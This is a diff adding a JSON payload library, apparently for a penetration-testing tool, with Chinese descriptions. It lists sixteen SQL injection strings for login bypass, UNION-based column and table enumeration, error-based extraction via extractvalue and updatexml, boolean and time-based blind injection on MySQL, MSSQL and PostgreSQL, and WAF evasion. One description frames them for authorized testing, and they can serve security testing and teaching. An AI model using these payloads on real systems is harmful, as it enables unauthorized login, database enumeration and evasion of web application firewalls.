@@ -1,0 +1,184 @@
+{
+  "kind": "payload",
+  "version": 1,
+  "group": "SQL 注入",
+  "categories": ["认证绕过", "联合查询", "报错注入", "盲注", "绕过技巧"],
+  "items": [
+    {
+      "id": "sqli-auth-bypass",
+      "title": "经典登录绕过",
+      "category": "认证绕过",
+      "code": "admin' OR '1'='1' -- ",
+      "desc": "闭合单引号后构造恒真条件并注释后续语句，用于授权测试中的登录框注入验证。",
+      "tags": ["sqli", "login", "bypass"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP / PayloadsAllTheThings"
+    },
+    {
+      "id": "sqli-auth-bypass-hash",
+      "title": "井号注释绕过",
+      "category": "认证绕过",
+      "code": "admin'#",
+      "desc": "MySQL 中 # 为行注释，可截断密码校验部分，适合快速验证。",
+      "tags": ["sqli", "mysql"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP / PayloadsAllTheThings"
+    },
+    {
+      "id": "sqli-numeric-true",
+      "title": "数字型恒真条件",
+      "category": "认证绕过",
+      "code": "1 OR 1=1",
+      "desc": "适用于未加引号的数字型参数，注意字段类型与括号闭合。",
+      "tags": ["sqli", "numeric"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP / PayloadsAllTheThings"
+    },
+    {
+      "id": "sqli-union-null",
+      "title": "联合查询探测列数",
+      "category": "联合查询",
+      "code": "' UNION SELECT NULL,NULL,NULL-- -",
+      "desc": "逐步增减 NULL 数量直到页面正常回显，以确定查询列数。",
+      "tags": ["sqli", "union"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP / PayloadsAllTheThings"
+    },
+    {
+      "id": "sqli-union-version",
+      "title": "联合查询读取版本",
+      "category": "联合查询",
+      "code": "' UNION SELECT @@version,user(),database()-- -",
+      "desc": "列数确认后替换回显位，读取数据库版本、当前用户与库名。",
+      "tags": ["sqli", "union", "enum"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP / PayloadsAllTheThings"
+    },
+    {
+      "id": "sqli-union-tables",
+      "title": "联合查询枚举表名",
+      "category": "联合查询",
+      "code": "' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()-- -",
+      "desc": "从 information_schema 读取当前库的所有表名。",
+      "tags": ["sqli", "enum"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP / PayloadsAllTheThings"
+    },
+    {
+      "id": "sqli-error-extractvalue",
+      "title": "extractvalue 报错注入",
+      "category": "报错注入",
+      "code": "' AND extractvalue(1,concat(0x7e,version()))-- -",
+      "desc": "利用 XPath 报错把查询结果带出，适用于无回显但显示错误信息的场景。",
+      "tags": ["sqli", "error-based"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP / PayloadsAllTheThings"
+    },
+    {
+      "id": "sqli-error-updatexml",
+      "title": "updatexml 报错注入",
+      "category": "报错注入",
+      "code": "' AND updatexml(1,concat(0x7e,database()),1)-- -",
+      "desc": "与 extractvalue 类似，受 MySQL 版本与函数禁用策略影响。",
+      "tags": ["sqli", "error-based"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP / PayloadsAllTheThings"
+    },
+    {
+      "id": "sqli-boolean",
+      "title": "布尔盲注判断",
+      "category": "盲注",
+      "code": "' AND SUBSTRING(database(),1,1)='a'-- -",
+      "desc": "通过页面真伪差异逐字符推断数据，可配合 Burp Intruder 或 sqlmap。",
+      "tags": ["sqli", "blind"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP / PayloadsAllTheThings"
+    },
+    {
+      "id": "sqli-time-mysql",
+      "title": "MySQL 时间盲注",
+      "category": "盲注",
+      "code": "' AND IF(1=1, SLEEP(5), 0) -- ",
+      "desc": "恒真时延迟 5 秒，通过响应时间判断条件是否成立。",
+      "tags": ["sqli", "time-based"],
+      "vars": [],
+      "risk": "attack",
+      "source": "公开资料"
+    },
+    {
+      "id": "sqli-time-mssql",
+      "title": "MSSQL 时间盲注",
+      "category": "盲注",
+      "code": "'; IF (1=1) WAITFOR DELAY '0:0:5'-- ",
+      "desc": "SQL Server 的延时写法，注意堆叠查询权限。",
+      "tags": ["sqli", "mssql", "time-based"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP / PayloadsAllTheThings"
+    },
+    {
+      "id": "sqli-time-pgsql",
+      "title": "PostgreSQL 时间盲注",
+      "category": "盲注",
+      "code": "'; SELECT pg_sleep(5)-- ",
+      "desc": "PostgreSQL 延时函数，常用于盲注验证。",
+      "tags": ["sqli", "pgsql", "time-based"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP / PayloadsAllTheThings"
+    },
+    {
+      "id": "sqli-stacked",
+      "title": "堆叠查询延时",
+      "category": "盲注",
+      "code": "'; SELECT SLEEP(5)-- ",
+      "desc": "在支持堆叠查询的环境中执行第二条语句，权限受限时可能失败。",
+      "tags": ["sqli", "stacked"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP / PayloadsAllTheThings"
+    },
+    {
+      "id": "sqli-inline-comment",
+      "title": "内联注释绕过 WAF",
+      "category": "绕过技巧",
+      "code": "' /*!50000UNION*/ /*!50000SELECT*/ NULL,NULL-- -",
+      "desc": "MySQL 内联注释可绕过部分关键字匹配规则，版本号需与目标匹配。",
+      "tags": ["sqli", "waf", "bypass"],
+      "vars": [],
+      "risk": "attack",
+      "source": "公开 WAF 绕过资料"
+    },
+    {
+      "id": "sqli-wide-byte",
+      "title": "宽字节注入",
+      "category": "绕过技巧",
+      "code": "%df' OR 1=1-- ",
+      "desc": "利用 GBK 编码把反斜杠吃掉，适用于使用 GBK 连接的 PHP 应用。",
+      "tags": ["sqli", "gbk", "bypass"],
+      "vars": [],
+      "risk": "attack",
+      "source": "公开 WAF 绕过资料"
+    },
+    {
+      "id": "sqli-case-bypass",
+      "title": "大小写混写绕过",
+      "category": "绕过技巧",
+      "code": "' UnIoN SeLeCt NULL,NULL-- -",
+      "desc": "针对仅匹配大写或小写关键字的粗略规则，实际效果取决于 WAF 实现。",
+      "tags": ["sqli", "waf", "bypass"],
+      "vars": [],
+      "risk": "attack",
+      "source": "公开 WAF 绕过资料"
+    }
+  ]
+}
